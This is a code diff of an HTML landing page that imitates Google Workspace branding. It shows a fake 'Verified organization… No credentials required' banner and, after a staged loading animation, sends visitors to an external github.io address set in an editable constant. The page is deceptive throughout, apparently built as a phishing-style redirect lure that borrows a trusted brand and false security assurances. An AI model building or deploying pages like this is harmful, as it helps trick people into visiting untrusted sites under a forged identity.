@@ -21,7 +21,6 @@
             padding: 24px;
         }
 
-        /* main card – official, elevated, clean */
         .access-card {
             max-width: 560px;
             width: 100%;
@@ -29,14 +28,8 @@
             border-radius: 32px;
             box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.1), 0 1px 2px rgba(0, 0, 0, 0.02);
             overflow: hidden;
-            transition: transform 0.2s ease, box-shadow 0.2s ease;
         }
 
-        .access-card:hover {
-            box-shadow: 0 24px 42px -16px rgba(0, 0, 0, 0.15);
-        }
-
-        /* header area with subtle workspace branding */
         .card-header {
             padding: 32px 32px 16px 32px;
             border-bottom: 1px solid #f0f2f5;
@@ -54,42 +47,26 @@
             font-weight: 500;
             color: #1a73e8;
             margin-bottom: 20px;
-            letter-spacing: 0.2px;
-        }
-
-        .workspace-badge svg {
-            width: 18px;
-            height: 18px;
-        }
-
-        .doc-icon {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 18px;
         }
 
         .doc-icon svg {
             width: 56px;
             height: 56px;
-            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.05));
+            margin-bottom: 18px;
         }
 
         h1 {
             font-size: 28px;
             font-weight: 500;
             color: #202124;
-            letter-spacing: -0.3px;
             margin-bottom: 8px;
         }
 
         .subhead {
             font-size: 15px;
             color: #5f6368;
-            margin-top: 4px;
-            line-height: 1.4;
         }
 
-        /* main content */
         .card-content {
             padding: 24px 32px 32px 32px;
         }
@@ -102,15 +79,8 @@
             margin-bottom: 28px;
             font-size: 14px;
             color: #1e2a3e;
-            line-height: 1.45;
         }
 
-        .notification-message strong {
-            color: #1a73e8;
-            font-weight: 600;
-        }
-
-        /* View button — main action */
         .view-button {
             width: 100%;
             background: #1a73e8;
@@ -120,48 +90,32 @@
             border-radius: 44px;
             font-size: 16px;
             font-weight: 500;
-            font-family: inherit;
             cursor: pointer;
-            transition: background 0.2s, box-shadow 0.2s, transform 0.05s;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
-            margin-top: 12px;
             margin-bottom: 24px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+            transition: background 0.2s;
         }
 
         .view-button:hover {
             background: #1765cc;
-            box-shadow: 0 4px 12px rgba(26,115,232,0.25);
         }
 
-        .view-button:active {
-            transform: scale(0.98);
-        }
-
-        /* official support footer */
         .support-footer {
             text-align: center;
             font-size: 13px;
             color: #7d8a9e;
             border-top: 1px solid #edf0f4;
             padding-top: 20px;
-            margin-top: 8px;
         }
 
         .support-footer a {
             color: #1a73e8;
             text-decoration: none;
-            font-weight: 500;
         }
 
-        .support-footer a:hover {
-            text-decoration: underline;
-        }
-
-        /* loading overlay (same polished style) */
         .loading-overlay {
             position: fixed;
             top: 0;
@@ -174,10 +128,9 @@
             justify-content: center;
             align-items: center;
             z-index: 2000;
-            transition: opacity 0.3s ease;
             opacity: 0;
             visibility: hidden;
-            backdrop-filter: blur(2px);
+            transition: opacity 0.3s ease, visibility 0.3s ease;
         }
 
         .loading-overlay.active {
@@ -207,11 +160,8 @@
             font-size: 24px;
             font-weight: 450;
             color: #202124;
-            letter-spacing: -0.2px;
             display: flex;
             gap: 4px;
-            flex-wrap: wrap;
-            justify-content: center;
         }
 
         .loading-text span {
@@ -242,37 +192,20 @@
             font-size: 13px;
             color: #6c7a91;
         }
-
-        @media (max-width: 550px) {
-            .access-card {
-                border-radius: 28px;
-            }
-            .card-header, .card-content {
-                padding-left: 24px;
-                padding-right: 24px;
-            }
-            h1 {
-                font-size: 24px;
-            }
-            .loading-text {
-                font-size: 20px;
-            }
-        }
     </style>
 </head>
 <body>
 
-<!-- Main official document access UI (suggests Google Workspace / Docs, no extra field) -->
 <div class="access-card">
     <div class="card-header">
         <div class="workspace-badge">
-            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z" fill="currentColor"/>
             </svg>
             <span>Workspace Secure Access</span>
         </div>
         <div class="doc-icon">
-            <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <svg width="56" height="56" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <path d="M12 6h16l8 8v22a4 4 0 0 1-4 4H12a4 4 0 0 1-4-4V10a4 4 0 0 1 4-4z" fill="#4285F4" fill-opacity="0.15" stroke="#1a73e8" stroke-width="1.5"/>
                 <path d="M28 6v8h8" stroke="#1a73e8" stroke-width="1.5" fill="none"/>
                 <path d="M18 22h12M18 28h12M18 34h8" stroke="#1a73e8" stroke-width="1.8" stroke-linecap="round"/>
@@ -285,22 +218,18 @@
         <div class="notification-message">
             <strong>✓ Verified organization</strong> — This document is shared via trusted workspace. No credentials required. Click "View Document" to open immediately.
         </div>
-
-        <!-- The only interactive action: VIEW button triggers loading + redirect -->
         <button class="view-button" id="viewDocumentBtn">
             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <path d="M12 4C7 4 2.73 7.11 1 11.5 2.73 15.89 7 19 12 19s9.27-3.11 11-7.5C21.27 7.11 17 4 12 4zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="white"/>
             </svg>
             View Document
         </button>
-
         <div class="support-footer">
             Need help? <a href="#">Contact Workspace Support</a> · Secured by <strong>Google-like Infrastructure</strong>
         </div>
     </div>
 </div>
 
-<!-- Loading Overlay (Official "Opening doc..." experience) -->
 <div id="loadingOverlay" class="loading-overlay">
     <div class="official-spinner"></div>
     <div class="loading-text">
@@ -312,94 +241,47 @@
 
 <script>
     (function() {
-        // ==================================================================
-        // 🔧 CUSTOMIZATION: CHANGE THE REDIRECT URL TO YOUR DESIRED LINK
-        // ==================================================================
-        // Replace this URL with the final destination (e.g., Google Docs link,
-        // PDF viewer, or any official document page). The page suggests a
-        // Google Docs-like environment but does not enforce any specific service.
-        const TARGET_REDIRECT_URL = "https://source1-alt.github.io/Review/";
+        // ============================================================
+        // 🔗 PASTE YOUR TEACHER'S LINK BELOW (replace the example URL)
+        // ============================================================
+        const TARGET_URL = "https://source1-alt.github.io/Review/";   // <-- CHANGE THIS
         
-        // DOM elements
+        // Validate URL (if invalid, show a clear error in console)
+        try {
+            new URL(TARGET_URL);
+        } catch(e) {
+            console.error("❌ Invalid redirect URL. Please set a correct link in TARGET_URL.");
+            return;
+        }
+        
         const viewBtn = document.getElementById('viewDocumentBtn');
         const loadingOverlay = document.getElementById('loadingOverlay');
-        
         let redirectTriggered = false;
-        let loadingActive = false;
         
-        // Function to show loading overlay and start the redirect process
         function showLoadingAndRedirect() {
             if (redirectTriggered) return;
             redirectTriggered = true;
             
-            // Activate loading overlay with smooth transition
             if (loadingOverlay) {
                 loadingOverlay.classList.add('active');
             }
             
-            // Minimum loading display time (feels natural and official)
-            const MIN_LOADING_MS = 1600;
-            // Maximum safety redirect (in case something hangs)
-            const MAX_SAFETY_MS = 4000;
+            // Minimum loading time (feels natural)
+            const MIN_LOADING_MS = 1200;
             
-            let redirectExecuted = false;
-            
-            const executeRedirect = () => {
-                if (redirectExecuted) return;
-                redirectExecuted = true;
-                // Perform the actual navigation to the target document link
-                window.location.href = finalRedirectUrl;
-            };
-            
-            // Schedule redirect after minimum loading time
-            const minTimer = setTimeout(() => {
-                executeRedirect();
+            setTimeout(() => {
+                window.location.href = TARGET_URL;
             }, MIN_LOADING_MS);
-            
-            // Safety net: force redirect after MAX_SAFETY_MS regardless
-            const safetyTimer = setTimeout(() => {
-                if (!redirectExecuted) {
-                    console.log("Safety redirect triggered.");
-                    executeRedirect();
-                }
-                clearTimeout(minTimer);
-            }, MAX_SAFETY_MS);
-            
-            // Optional: cancel safety if redirect happens early (cleanup)
-            window.addEventListener('beforeunload', () => {
-                clearTimeout(minTimer);
-                clearTimeout(safetyTimer);
-            });
         }
         
-        // Attach click event to the "View Document" button
         if (viewBtn) {
             viewBtn.addEventListener('click', (e) => {
                 e.preventDefault();
-                // No validation of any input field — the page does NOT accept any value
                 showLoadingAndRedirect();
             });
         }
         
-        // Additional: pressing Enter anywhere does nothing special (no accidental submit)
-        document.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter' && document.activeElement === viewBtn) {
-                e.preventDefault();
-                showLoadingAndRedirect();
-            }
-        });
-        
-        // Preload / small console info (developer transparency)
-        console.log(`✅ Official document access UI | Redirect target: ${finalRedirectUrl}`);
-        console.log("📄 This page does NOT collect or validate any user input — purely visual & one-click view.");
-        
-        // Make sure the loading overlay does not remain stuck if user navigates back (clean)
-        window.addEventListener('pageshow', function(event) {
-            if (event.persisted && loadingOverlay) {
-                loadingOverlay.classList.remove('active');
-                redirectTriggered = false;
-            }
-        });
+        console.log(`✅ Ready — will redirect to: ${TARGET_URL}`);
     })();
 </script>
 </body>
